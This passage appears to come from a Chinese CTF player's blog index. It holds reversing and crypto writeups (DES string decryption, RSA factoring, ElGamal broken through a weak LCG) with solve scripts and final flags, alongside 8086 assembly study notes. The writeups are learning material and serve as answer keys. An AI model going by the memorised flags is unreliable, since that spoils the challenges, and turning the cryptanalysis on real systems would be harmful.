TestClick.Messagebox.MessageBox(IntPtr.Zero, &quot;Emmmmm,I don't think so.&quot;, &quot;Info:&quot;, 0); }} 查看解密函数 123456789101112131415161718192021222324private string Decrypt(string str){ string result; try { byte[] bytes = Encoding.Unicode.GetBytes(TestClick.encryptKey); byte[] array = Convert.FromBase64String(str); DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider(); MemoryStream memoryStream = new MemoryStream(); CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(bytes, bytes), CryptoStreamMode.Write); cryptoStream.Write(array, 0, array.Length); cryptoStream.FlushFinalBlock(); byte[] bytes2 = memoryStream.ToArray(); cryptoStream.Close(); memoryStream.Close(); result = Encoding.Unicode.GetString(bytes2); } catch { result = str; } return result;} 只是将flag在base64解码后，使用了DES进行解密，注意使用的是CBC模式 查看EncryptData和encruptKey，得到密文为 11Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA== 密钥为1234 注意，在C#中，字符串默认是Unicode字符串，所以转成字节数组，在每个字符字节后都要加一个”\\x00” 进行解密： 12345678import base64from Crypto.Cipher import DESkey = b&quot;1\\x002\\x003\\x004\\x00&quot;des = DES.new(key,DES.MODE_CBC, key)cipher =b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode(&quot;utf-16&quot;)print(plain) 得到He_P1ay_Basketball_Very_We11!Hahahahaha!ࠈࠈࠈࠈ 然而提交并不是flag，查看大佬的wp后才发现密文和密钥被更换了 用Cheat Engine搜索字符串“Emmmm”，发现有两处 跟进其中一处看，发现有新的base64字符串，可能是真正的密文 进行解密 12345678910import base64from Crypto.Cipher import DESkey = b&quot;t\\x00e\\x00s\\x00t\\x00&quot;des = DES.new(key,DES.MODE_CBC, key)cipher = b&quot;xZWDZaKEhWNMCbiGYPBIlY3+arozO9zonwrYLiVL4njSez2RYM2WwsGnsnjCDnHs7N43aFvNE54noSadP9F8eEpvTs5QPG+KL0TDE/40nbU=&quot;#cipher =b&quot;1Tsy0ZGotyMinSpxqYzVBWnfMdUcqCMLu0MA+22Jnp+MNwLHvYuFToxRQr0c+ONZc6Q7L0EAmzbycqobZHh4H23U4WDTNmmXwusW4E+SZjygsntGkO2sGA==&quot;cipher = base64.b64decode(cipher)plain = des.decrypt(cipher).decode(&quot;utf-16&quot;)print(plain) 得到flag:flag{She_P1ay_Black_Hole_Very_Wel1!LOL!XD!}","link":"/2022/02/17/Reverse-3/"},{"title":"WriteUp of DASCTF Jan Crypto","text":"Writeup of DasCTF Jan Crypto[签到题]babyRSA附件一：chall.py 12345678910111213141516171819202122232425262728import osfrom secret import FLAG,p,q,efrom Crypto.Util.number import bytes_to_long,long_to_bytesN = p*qdef encrypt(m,N,e): return pow(m,e,N)def decrypt(c,N,d): return pow(c,d,N)def padding(msg): res = msg if len(res) &lt; 128: res = res + os.urandom(128-len(res)) return resdef transfer(msg): assert len(msg) &lt; 128 m = padding(msg) return bytes_to_long(m)if __name__ == &quot;__main__&quot;: m = transfer(FLAG) print(N,e) print(encrypt(m,N,e)) 附件二 enc 1213123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929 21993444050767187234397761068183914169867746374174528181624770259579762134771917236641844074172347938149264183669057516897896991381236582927189515470739382448359233781032645742623198680727921871297555706961277968561362798136589237779330699241398622219476279693304507357580915558995515876051755678822535656131639723966406639590483110776910457915166718570203793342171416518556587956147610696870291406014395979782033752442433430526874886065448561168276810654141879579560499471430173054832001220333438573702236782364698874212615929305491367081600410014383502275942657148007530729391264646477039622603589304775707984208771492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524 看完附件后可以知道是比较简单的RSA类型 一开始看到e这么大便想到了维纳攻击，可是试了一下并没有解出d（还怀疑了一下脚本是不是出错了） 而后试了一下用yafu进行大数分解，并没有结果 最后还是得靠factordb.com(事实证明还是在线大数分解nb) 解出 12n=98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033*133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513 随后就可以随便算了 1234567891011from libnum import n2simport gmpy2p=133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513q=98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033e=2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877c=1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)flag=pow(c,d,p)# print(flag)print(n2s(73358773651424897743944056106548202261075477721417992498861765573582087801960732601862778348189621203820703393958329215404058952130344307891818721974239491062466090539708313506265450891835557762707471433442189955809731728025144732654599245515720346423528093783755219533095697004480866822694256749445957788813)) 最终得到flag:hwctf{01d_Curs3_c4Me_Again} crypto_Elgamal题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from Crypto.Util.number import *from key import FLAGdef keygen(size): q = getPrime(80) k = getPrime(944) while True: p = q * k + 1 if isPrime(p): break k += 1 g = 2 while True: if pow(g, q, p) == 1: break g += 1 A = getRandomInteger(size) % q B = getRandomInteger(size) % q x = getRandomInteger(size) % q h = pow(g, x, p) return (g, h, A, B, p, q), (x)def rand(A, B, q): global rand_state rand_state, ret = (A * rand_state + B) % q, rand_state return retdef encrypt(pubkey, m): g, h, A, B, p, q = pubkey assert 0 &lt; m &lt;= p r = rand(A, B, q) c1 = pow(g, r, p) c2 = (m * pow(h, r, p)) % p return (c1, c2)rand_state = getPrime(1024)pubkey, privkey = keygen(1024)m = bytes_to_long(FLAG)c1, c2 = encrypt(pubkey, m)c1_, c2_ = encrypt(pubkey, m)print(c1, c2)print(c1_, c2_)s0 = 543263588863771657634119s1 = 628899245716105951093835s2 = 78708024695487418261582s3 = 598971435111109998816796s4 = 789474285039501272453373assert ( A * s0 + B ) % q == s1assert ( A * s1 + B ) % q == s2assert ( A * s2 + B ) % q == s3assert ( A * s3 + B ) % q == s4p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311g = 27642593390439430783453736408814717946185190497201679721975757020767271070510268596627490205095779429964809833535285315202625851326460572368018875381603399143376574281200028337681552876140857556460885848491160812604549770668188783258592940823128376128198726254875984002214053523752696104568469730021811399216h = 54585833166051670245656045196940486576634589000609010947618047461787934106392112227019662788387352615714332234871251868259282522817042504587428441746855906297390193418159792477477443129333707197013251839952389651332058368911829464978546505729530760951698134101053626585254469108630886768357270544236516534904c1 = 60724920570148295800083597588524297283595971970237964464679084640302395172192639331196385150232229004030419122038089044697951208850497923486467859070476427472465291810423905736825272208842988090394035980454248119048131354993356125895595138979611664707727518852984351599604226889848831071126576874892808080133c2 = 48616294792900599931167965577794374684760165574922600262773518630884983374432147726140430372696876107933565006549344582099592376234783044818320678499613925823621554608542446585829308488452057340023780821973913517239972817669309837103043456714481646128392677624092659929248296869048674230341175765084122344264c1_ = 42875731538109170678735196002365281622531058597803022779529275736483962610547258618168523955709341579773947887175626960699426438456382655370090748369934296474999389316334717699127421889816721511602392591677377678759026657582648354688447456509292302633971842316239774410380221303269351351929586256938787054867c2_ = 64829024929257668640929285124747107162970460545535885047576569803424908055130477684809317765011143527867645692710091307694839524199204611328374569742391489915929451079830143261799375621377093290249652912850024319433129432676683899459510155157108727860920017105870104383111111395351496171846620163716404148070 （分析不难，关键在于转化为RSA问题后对e和p-1不互素情况下根的求解） 粗略分析一下，发现有对同一flag加密得到的两组密文，而这两组密文的联系是随机数r1和r2。因此可以断定从伪随机数发生器入手，对密文组(c1,c2)，(c1_ , c2_ )进行变换从而得到flag(由于密钥x为止因此基本可以忽略c1和c1_) 而对于伪随机数发生器，题目也给了相应的提示： 12345678910s0 = 543263588863771657634119s1 = 628899245716105951093835s2 = 78708024695487418261582s3 = 598971435111109998816796s4 = 789474285039501272453373assert ( A * s0 + B ) % q == s1assert ( A * s1 + B ) % q == s2assert ( A * s2 + B ) % q == s3assert ( A * s3 + B ) % q == s4 线性方程组乱解一通后便得到了： 123q= 791763770658839585424113A=12742153496769814072597B=3035433788765894539799 接下来分析c2和c2_的关系，已c_2=m*h^{r_1}\\ mod\\ p,c_2\\_=m*h^{r_2}\\ mod\\ p，而r_2=r_1*A+B\\ mod\\ p 即： c_2\\_=m*h^{r_1*A+B}=m*h^{r_1*A}*h^B=m^{1-A}*(m*h^{r_1})^A*h^B=c_2^A*m^{1-A}*h^B\\ mod\\ p因此： m^{1-A}=c_2\\_*c_2^{-A}*h^{-B}\\ mod\\ p由此即可以得到$m^{1-A}\\ mod\\ p$的值，现在已经将Elgamal问题转换为加密指数e=1-A的类RSA问题了 问题棘手的地方在于$gcd(1-A,p-1)=7438$,无法直接对1-A求逆 接下来的解决方法可以参考这题：NCTF2019 easyRSA (附上写的非常详细的wpNCTF2019-官方writeup – 郁离歌丶的博客 (yulige.top))（接下来我都建议去看这篇wp） 实际上在$gcd(1-A,p-1)=e$的情况下，$m$有$e$个解 首先先尝试得到其中一个解： 详细方法和情形可以参考这篇paper1111.4877.pdf (arxiv.org) 快速定位到此处： 通过这个算法能找到方程其中的一个解 那么如何找到所有解呢？ 观察 x^{p-1}=1\\ mod\\ p\\\\ (x^{\\frac{p-1}{e}})^e=1\\ mod\\ p也就是说，若$r$是方程$x^e=c\\ mod\\ p$的一个解，那么 r^e=c\\ mod\\ p\\\\ (r*x^{i*\\frac{p-1}{e}})^e=r^e*x^{i*(p-1)}=r^e*1^i=c\\ mod\\ p(r*x^{i*\\frac{p-1}{e}})也是方程的解，其中$x$为$(1,p-1)$的一个随机数，$i \\in [0,e-1]$， 遍历$i$，既可以得到方程的所有解，最后在所有解中搜索符合字符串’flag’即可得到flag:flag{19e9f185e6a680324cedd6e6d9382743} （应该是没错的，写完的时候比赛已经结束了 /(ㄒoㄒ)/~~） 附上解方程的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import randomfrom libnum import n2simport sympydef rth_root(cip,r,q): &quot;&quot;&quot; cip^r==q &amp;&amp; r|q-1 &quot;&quot;&quot; rnum=random.randint(1,q) while (pow(rnum,(q-1)//r,q)==1): rnum=random.randint(1,q) t=1 while((q-1)%pow(r,t)==0): t+=1 t-=1 s=(q-1)//pow(r,t) k = 1 while (k * s + 1) % r != 0: k += 1 alpha = (k * s + 1) // r a=pow(rnum,pow(r,t-1)*s,q) b=pow(cip,r*alpha-1,q) c=pow(rnum,s,q) h=1 print('t='+str(t)) for i in range(1,t): # print('1213') d=pow(b,pow(r,t-1-i),q) if d==1: j=0 else: j=(-sympy.discrete_log(q,d,a))%q b=b*(pow(pow(c,r,q),j,q))%q h=h*pow(c,j,q)%q c=pow(c,r,q)%q return pow(cip,alpha,q)*h%qdef findAllPRoot(root,p,e): maySolve=[root] while(len(maySolve)&lt;e): maySolve.append(root*pow(random.randint(2,p-1),(p-1)//e,p)%p) print('finish') return maySolveflag=52498780852251471256496883766677451330444042209592264044862955792645421608045437240170037309824495794108442986910150817628974914953272047997425815789167047966004466233826304133412591056777880709534691777621768967479001867448270089911182059438848229977940628161790899565867768072121376211486485752798175076955e=7438p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311r=rth_root(flag,e,p)print(r)print(pow(r,e,p)==flag)maySolve=findAllPRoot(r,p,e)# x=random.randint(1,p)# solve2=r*pow(x,(p-1)//e,p)%p# print(solve2)# print(pow(solve2,e,p)==flag)print('start')file=open('111.txt','wb')for i in maySolve: file.write(n2s(i)) （写得比较乱，如有错漏还请客官指出）","link":"/2022/01/25/Writeup-of-DASCTF2022-Jan-Crypto2/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2022/01/19/hello-world/"},{"title":"堆栈平衡","text":"参考：堆栈平衡 - cat47 - 博客园 (cnblogs.com) （本篇其实也就搬运了一下） 什么是堆栈平衡 如果要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RET这条指令前,ESP指向的是我们压入栈中的地址 如果通过堆栈传递参数来，那么在函数执行完毕后，要平衡参数导致的堆栈变化 含义就是当函数在一步步执行的时候一直到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。 如果堆栈变化了，就要走ret执行前将堆栈恢复成原来的样子 会影响堆栈的情况1. 函数中push进栈例如： 1234call xx函数函数： mov ...(不影响堆栈平衡) push ...(影响堆栈平衡) ret... 2. 堆栈传递参数函数调用时传递参数通过向栈中压入参数完成，在被调用函数完成后该传递的参数也就失去了作用，需要将堆栈恢复到调用前的位置，例如： 主函数： 被调用函数： 堆栈如下： 解决方法1. 在函数外部调整栈顶地址使用add指令，对esp寄存器进行操作 2. 在函数内部添加 ret 8 是把ret和把第一种情况的add两条指令整合成一条指令，在函数内部完成堆栈平衡。","link":"/2022/02/03/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/"},{"title":"一些不错的技术文章（持续更新）","text":"C语言相关 C语言函数调用栈（一）C语言函数调用栈(一) - clover_toeic - 博客园 (cnblogs.com) C语言函数调用栈（二）C语言函数调用栈(二) - clover_toeic - 博客园 (cnblogs.com) 格式化字符串漏洞原理详解格式化字符串漏洞原理详解_ditto的博客-CSDN博客_格式化字符串漏洞 plt表和got表(27条消息) GOT表和PLT表知识详解_qq_18661257的专栏-CSDN博客_got表 工具学习 checksec及其包含的保护机制[讨论]checksec及其包含的保护机制-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com pwntools学习：[原创][新手向] 一步一步学pwntools-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (27条消息) IDA反编译失败总结_寻梦&amp;之璐-CSDN博客 Linux: 浅谈elf中的got和plt(27条消息) 浅析ELF中的GOT与PLT__wells的博客-CSDN博客_got plt 待分类","link":"/2022/02/03/%E4%B8%80%E4%BA%9B%E4%B8%8D%E9%94%99%E7%9A%84%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"},{"title":"汇编语言(2) 第一个程序","text":"还是只想摸鱼 4.1 一个源程序从写出到执行的过程 编写汇编源程序 对源程序进行编译链接 执行可执行文件中的程序 4.2 源程序12345678910111213assume cs:codesgcodesg segment mov ax,0123H mov bx,0456H add ax,bx add ax,ax mov ax,4c00H int 21Hcodesg endsend 1、伪指令汇编语言源程序中，包含两种指令，一种是汇编指令，一种是伪指令。 伪指令没有对应的机器指令，最终不被CPU执行，而是由编译器执行来进行相关的编译工作。 XXX segment … XXX ends segment和ends是一对成对使用的伪指令，其功能为定义一个段，一个段还必须有一个名称来标识 end end是一个汇编程序的结束标记。编译器在编译汇编程序过程中，若碰到伪指令end，则结束对源程序的编译。 （注意区分end和ends） assume assume假设某一段寄存器和程序中的某一个用segment…ends定义的段相关联。 2、程序返回一个程序结束后，需要将CPU的控制权返还给使它运行的程序。 相关指令： 12mov ax,4c00Hint 21H 4.3 编辑源程序4.4 编译通过运行masm编译.asm文件生成.obj文件 4.5 连接运行line.exe，将上一步生成的.obj文件进行连接，生成可执行的.exe文件 连接的作用： Summary DOS系统中.EXE文件中程序的加载过程","link":"/2022/01/28/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-2-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/"},{"title":"汇编语言(4) 包含多个段的程序","text":"好久没学习，一直在摸鱼，罪过罪过 6.1 在代码段中使用数据在程序中直接存放数据时，数据会被转译为指令，此时需要使用”start”和”end start”指明程序执行的入口，如 在编译、连接后，由”end start“指明的程序入口，被转化为一个入口地址，存储在可执行文件的描述信息中。 6.2 在代码段中使用栈6.3 将数据、代码、栈放入不同的段 定义多个段的方法：与此前定义代码段的方法无区别 对段地址的引用：在程序中，段名代表了段地址，因此指令“mov ax,data”的含义就是将名称为data的段的段地址送入ax “代码段”、“数据段”、“栈段”完全是我们的安排 仅是便于阅读，CPU并不知道他们，并不是说将某个段定义为“代码段”CPU就会自动执行它 即使使用以下伪指令将cs、ds和ss分别与code、data、stack段相连，CPU也不会自动将cs指向code，ds指向data，ss指向stack 1assume cs:code,ds:data,ss:stack CPU如何知道程序入口？在源程序的最后用“end start”说明了程序的入口，这个入口将被写入可执行文件的描述信息，可执行文件中的程序被加载入内存后，CPU的CS:IP将被设置指向这个入口。","link":"/2022/02/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-4-%E5%8C%85%E5%90%AB%E5%A4%9A%E4%B8%AA%E6%AE%B5%E7%9A%84%E7%A8%8B%E5%BA%8F/"},{"title":"汇编语言(5) 更灵活的定位内存地址的方法","text":"7.1 and 和 or 指令and 指令：逻辑与指令，按位进行与运算例如： 123mov al,01100011Band a1,00111011B;a1=00100011B or 指令：逻辑或指令，按位进行或运算例如： 123mov al,01100011Bor al,00111011B;al=01111011B 7.2 ASCII码略 7.3 以字符形式给出的数据在汇编程序中，可以用‘…’的方式指明数据是以字符的形式给出，编译器将自动将其转化为ASCII码 例如： 1db 'unIX' ;相当于 &quot;db 75H,6EH,49H,58H&quot; 7.4 大小写转换的问题观察大小写字符的规律，发现一个字母不管大小写，只用将其第五位置0，它就必为大写字母，置1则变为小写字母 因此通过or和and指令即可以转换大小写字母 12and al,11011111B ;将第五位置0，转变为大写字母or al,00100000B ;将第五位置1，变为小写字母 7.5 [bx+idata]可用以下方式更灵活的指明一个内存单元 12345mov ax,[bx+200] ;主要; 以下方式也可以mov ax,[200+bx]mov ax,200[bx]mov ax,[bx].200 7.6 用[bx+idata]的方式进行数组的处理 7.7 SI和DIsi和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用 123456789mov bx,[0]mov ax,[bx+123];mov si,0mov ax,[si+123];mov di,0mov ax,[di+123];以上三组指令实现了相同的功能 7.8 [bx+si]和[bx+di]可以使用[bx+si]和[bx+di]的方式来指明一个内存单元，其偏移地址为(bx)+(si)/(di) (即bx中的数值加上si/di中的数值)，如 1mov ax,[bx+si] 该指令也可写成如下格式： 1mov ax,[bx][si] 7.9 [bx+si+idata]和[bx+di+idata]1mov ax,[bx+si+idata] (ax)=((ds)*16+(bx)+(si)+idata)，将偏移地址为bx中的数值+si中的数值+idata的字送入ax 也可写成如下数值 123mov ax,200[bx][si]mov ax,[bx].200[si]mov ax,[bx][si].200 7.10 不同的寻址方式的灵活应用二重循环的处理如以下程序，存在一定的问题： 123456789101112131415mov ax,datasgmov ds,axmov bx,0mov cx,4s0: mov si,0 mov cx,3s: mov al,[bx+si] and al,11011111b mov [bx+si],al inc si loop s add bx,16 loop s0 进行了二重循环，却只用了一个循环计数器，造成在进行内层循环的时候，覆盖了外层循环的循环计数器。 实验六：编程，将datasg段中每个单词的前4个字母改为大写字母 123456789101112131415161718192021222324252627282930313233343536373839404142ASSUME CS:codesg, DS:datasg, SS:stacksgstacksg segment dw 0,0,0,0,0,0,0,0stacksg endsdatasg segment db '1. display ' db '2. brows ' db '3. replace ' db '4. modify 'datasg endscodesg segment start: mov ax,stacksg mov ss,ax mov sp,16 mov ax,datasg mov ds,ax mov cx,4 mov bx,0 mov si,0 s: push cx mov cx,4 mov si,0 s1: mov al,ds:[bx+3+si] and al,11011111B mov ds:[bx+3+si],al inc si loop s1 pop cx add bx,16 loop s mov ax,4c00h int 21hcodesg endsend start","link":"/2022/02/14/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-5-%E6%9B%B4%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E4%BD%8D%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/"},{"title":"汇编语言（1）寄存器（内存访问）","text":"最近只想摸鱼 3.1 内存中字的存储 字单元，即存放一个字形数据（16位）的内存单元，有两个地址连续的内存单元组成。 图中字形数据4E20H的低位字节存放在0号单元中，高位字节存放在1号单元中 （在这里复习下大端存储和小段存储：) 大端存储：数据的低位保存在内存中的高地址中，数据的高位保存在内存的低地址中 小端存储：数据的高位保存在内存中的高地址中，数据的低位保存在内存的低地址中 3.2 DS和[address]8086CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址。 比如要读取10000H单元的内容，可用如下程序段进行： 123mov bx,1000Hmov ds,bxmov a1,[0] “[…]”表示一个内存单元，其中的0表示偏移地址。 另：8086CPU不支持直接将数据送入段寄存器，即不能直接：mov ds,1000H。需要一个寄存器进行中继的操作。 3.7 栈在内存中划出一段空间当作栈使用，栈的地址存放在寄存器SS中，寄存器SP则指向栈顶的位置。因此，任意时刻，SS:SP指向栈顶元素。 push指令：1push ax 这段指令的意义为将寄存器ax的值压入栈中，有以下两步完成： pop指令1pop ax 这段指令的意义为将栈顶的值赋给ax，有以下两步完成： 值得注意的是，pop操作后，1000CH处的2266H仍存在，尽管它已不在栈中。当有新的元素Push入栈时，则会在上面覆写新的数据。 栈空的状态 3.8 栈越界8086CPU不保证我们对栈的操作不会越界 3.10 栈段 答案：SP=0。（寄存器SP只能存储16位的数据，因此需要模2^16。假设pop一个元素，SP-=2，SP=FFFEH） 总结：​ 一段内存，是代码段，还是数据存储空间，还是栈空间，取决于寄存器中CS、IP、SS、SP、DS的指向。 ​ CS:IP指向的地方位代码段，SS:SP指向的地方为栈空间，DS存放数据段地址。 附上一段代码，此处说明了一段内存既可以是代码段，可以是数据的存储空间，也可以是栈空间：","link":"/2022/01/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%881%EF%BC%89%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%EF%BC%89/"},{"title":"汇编语言(6) 数据处理的两个基本问题","text":"定义描述性符号：reg和sreg: reg：表示一个寄存器，包括ax、bx、bx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di sreg：表示一个段寄存器，包括ds、ss、cs、es 8.1 bx、si、di和bp 在8086CPU中，只有这四个寄存器可以在“[…]”中进行内存单元的寻址。如 12mov ax,[bp+si] ;正确mov ax,[cx] ;错误 在[…]中，这4个寄存器可以单个出现，或只能以四种组合出现bx和si、bx和di、bp和si、bp和di 1234mov ax,[bx+si]mov ax,[bp+di] ;正确mov ax,[bx+bp]mov ax,[si+di] ;错误 只要在[…]中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中 8.2 机器指令处理的数据在什么地方8.3 汇编语言中数据位置的表达三个概念来表达数据的位置 立即数。在汇编指令中直接给出，执行前在CPU的指令缓冲器中 寄存器。指令要处理的数据在寄存器中。 段地址(SA)和偏移地址(EA)。指令要处理的数据在内存中。 8.4 寻址方式 8.5 指令要处理的数据有多长8086CPU的指令可以处理两种尺寸的数据：byte和word，因此要在机器指令中指明长度。 通过寄存器名指明要处理的数据尺寸。 12mov ax,1 ;指明进行子操作mov al,1 ;指明进行字节操作 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte 12mov word ptr ds:[0],1;指明访问的内存单元为字单元mov byte ptr ds:[0]:1;指明访问的内存单元为字节单元 其它方法。有些指令默认访问的是字单元还是字节单元。如Push指令只进行字操作。 8.6 寻址方式的综合应用8.7 div指令div是除法指令，使用div做除法时应注意以下问题： 除数：有8位和16位两种，在一个reg或内存单元中 被除数：默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位 结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数 利用除法指令计算100001/100：除数100小于255，可以在一个8位寄存器中存放，但由于被除数是32位的，除数应为16位，所以用一个16位寄存器来存放除数100 1234mov dx,1mov ax,86a1h ;(dx)*10000h+(ax)=100001mov bx,100div bx 8.8 伪指令dd前面用db和dw定义字节型数据和字型数据。dd是用来定义dword(double word)型数据的。 8.9 dup与db、dw、dd等数据定义伪指令配合使用，用来进行数据的重复，如： 123db 3 dup (0) ;定义三个字节，它们的值都是0db 3 dup (0,1,2) ;定义了9个字节，它们是0、1、2、0、1、2、0、1、2db 3 dup ('abc','ABC') ;定义了18个字节，它们是'abcABCabcABCabcABC 可见，dup的使用格式如下： 实验七 寻址方式在结构化数据访问中的应用题目：（data段在代码中） code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081assume cs:codesgdata segment db '1975','1976','1977','1978','1979','1980','1981','1982','1983' db '1984','1985','1986','1987','1988','1989','1990','1991','1992' db '1993','1994','1995';4*21=84bytes dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514 ;0x10h,0x16h,0x17eh dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5927000;4*21=84bytes dw 3,7,9,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226 dw 11542,14430,15257,17800data endstable segment db 21 dup ('year summ ne ?? ')table endscodesg segment start: mov ax,data mov ds,ax mov ax,table mov ss,ax;放入年份 mov bx,0 mov si,0 mov cx,21 ;由于存在两重循环，使用dx记录cx的值 mov bp,0 s1: mov dx,cx mov cx,4 s2: mov al,ds:[bp+si] mov ss:[bx+si],al inc si loop s2 add bx,16 add bp,4 mov si,0 mov cx,dx loop s1;放入收入 mov cx,21 mov bx,0 mov di,7 mov si,0 s3: mov ax,ds:[si+86] ;收入 mov ss:[bx+di],ax mov ax,ds:[si-2+86] mov ss:[bx+di-2],ax add bx,16 add si,4 loop s3;放入雇员数 mov cx,21 mov si,0 mov bx,0 s4: mov ax,ds:[si+168] ;雇员数 mov ss:[bx+10],ax add si,2 add bx,16 loop s4;计算人均收入，并将结果存入表中;32位除16位，AX存储除法操作的商 mov cx,21 mov bp,0 s5: mov dx,ss:[bp+7] mov ax,ss:[bp+5] mov bx,ss:[bp+10] div bx mov ss:[bp+13],ax add bp,16 loop s5 mov ax,4c00h int 21hcodesg endsend start （感觉寄存器要不够用了-.-!） 结果截图：","link":"/2022/02/25/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-6-%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/"},{"title":"汇编语言（3） [BX]和loop指令","text":"摸鱼才是正义！ 5.0 前置定义[bx]是什么[bx]和[0]类似，表示内存中的偏移地址，不同的是[bx]中的偏移地址存放在bx寄存器中，如下面的指令： 1mov ax,[bx] 表示将一个内存单元的内容送入ax，这个内存单元的长度为2字节，段地址在寄存器ds中，偏移地址在bx中。 loop循环 书中定义的描述性符号：“()”书中使用“()”来表示一个寄存器或一个内存单元中的内容，”()“中的内容可以有3中类型：①寄存器名 ② 段寄存器名 ③ 内存单元的物理地址。比如： (ax)表示ax中的内容、(al)表示al中的内容、(20000H)表示内存20000H单元的内容 约定符号idata表示常量1mov ax,[idata] 